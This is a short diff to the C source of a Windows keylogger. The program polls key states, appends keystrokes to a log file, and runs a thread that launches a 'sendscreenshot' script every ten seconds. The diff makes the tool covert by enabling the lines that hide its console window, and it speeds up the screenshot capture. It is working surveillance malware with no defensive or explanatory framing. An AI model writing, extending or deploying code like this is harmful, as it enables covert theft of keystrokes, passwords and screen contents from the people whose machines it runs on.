@@ -4,11 +4,12 @@
 #include <winuser.h>
 #include <pthread.h>
 #include <unistd.h>
+#include <time.h>
 
 void* callPythonScript(void* arg) {
     while (1) {
-        system("dist\\sendscreenshot.exe");
-        sleep(20);
+        system("py sendscreenshot.py");
+        sleep(10);
     }
     pthread_exit(NULL);
 }
@@ -23,8 +24,8 @@ int main() {
         return 1;
     }
     char i;
-    //HWND hwnd = GetConsoleWindow();
-    //ShowWindow(hwnd, SW_HIDE);
+    HWND hwnd = GetConsoleWindow();
+    ShowWindow(hwnd, SW_HIDE);
     while (1) {
         for (i = 8; i <= 190; i++) {
             if (GetAsyncKeyState(i) == -32767) {
@@ -39,7 +40,7 @@ int main() {
 int SaveLogs(int key_stroke, char *file) {
     FILE *logs;
 
-    logs = fopen(file, "a+");
+    logs = fopen(file, "a");
 
     if (logs == NULL) {
         return 1;
